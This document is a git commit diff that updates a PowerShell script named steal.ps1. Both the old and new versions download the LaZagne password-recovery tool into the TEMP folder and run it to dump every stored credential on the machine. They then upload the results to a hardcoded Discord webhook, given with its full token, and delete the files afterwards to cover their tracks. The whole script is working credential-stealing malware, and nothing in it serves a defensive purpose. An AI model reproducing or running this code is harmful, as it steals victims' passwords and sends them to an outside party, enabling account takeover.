b0133ba016c7aa7e5885900b4a9b562b94076067
Sizl <102216599+FuziPavuzi@users.noreply.github.com>
2025-06-26 14:02:39 +0200

    Update steal.ps1

--- steal.ps1
+++ steal.ps1
@@ -1,9 +1,6 @@
-$T=$env:TEMP
-$OutFile="$T\l.exe"
-Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile $OutFile
-Start-Sleep -s 2
-$output = & "$OutFile" all -vv
-$File = "$T\$env:COMPUTERNAME.txt"
-$output | Out-File $File
-Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1366126236455407616/wHyn4EgoxcqTd8oJaxYeu6yowiF8fXhsJA69OvobS0uu4OBT74OEx_wTvImoIJ34qX5X" -Method Post -InFile $File -ContentType "multipart/form-data"
-Remove-Item $OutFile, $File -Force -ErrorAction SilentlyContinue
+$t=$env:TEMP
+Invoke-WebRequest 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe' -OutFile "$t\l.exe"
+Start-Sleep -s 5
+& "$t\l.exe" all -vv > "$t\pw.txt"
+Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1366126236455407616/wHyn4EgoxcqTd8oJaxYeu6yowiF8fXhsJA69OvobS0uu4OBT74OEx_wTvImoIJ34qX5X" -Method Post -InFile "$t\pw.txt" -ContentType "multipart/form-data"
+Remove-Item "$t\l.exe","$t\pw.txt" -Force -ErrorAction SilentlyContinue
